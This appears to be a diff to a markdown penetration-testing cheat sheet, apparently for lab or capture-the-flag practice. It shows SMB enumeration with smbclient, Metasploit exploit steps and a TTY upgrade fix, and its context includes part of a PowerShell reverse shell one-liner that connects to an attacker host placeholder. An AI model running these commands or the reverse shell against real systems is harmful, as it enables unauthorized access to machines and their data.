@@ -15,11 +15,13 @@ nc -nv <TARGET_IP> <PORT>
 ```
 #### SMB Enumeration
 ```bash
-smbclient -N -L \\\<TARGET_IP>
+# List available shares; -N means no password
+smbclient -N -L //<TARGET_IP>
 ```
 ```bash
 smbclient -U bob \\\\<TARGET_IP>/<PATH> # PATH wiill be taken from previous command
 ```
+
 
 ## Web Enumeration
 This sub-section contains a bunch of commands for Enumeration of Web Services
@@ -55,6 +57,7 @@ msfconsole
 msf > search exploit <EXPLOIT_NAME>
 msf > use <EXPLOIT_ID>
 msf > show options
+msf > show payloads
 msf > set <PARAM>
 check
 exploit # or run can also be used 
@@ -74,7 +77,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER
 ```
 #### Upgrading TTY
 ```bash
-python -c 'import pty; pty.spawn("bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 #### Privilege Escalation
 ```bash
